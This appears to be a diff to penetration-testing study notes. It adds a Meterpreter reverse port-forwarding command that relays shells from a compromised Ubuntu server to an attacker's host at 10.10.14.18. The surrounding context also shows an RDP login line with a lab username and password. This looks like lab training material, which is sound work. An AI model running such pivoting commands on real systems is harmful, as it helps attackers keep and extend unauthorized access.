@@ -354,8 +354,12 @@ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
 ## Meterpreter Reverse Port Forwarding
 \
 - listen on a specific port on the compromised server
-- orward all incoming shells from the Ubuntu server to our attack host
+- forward all incoming shells from the Ubuntu server to our attack host
 
+
+```shell-session
+portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+```
 
 
 
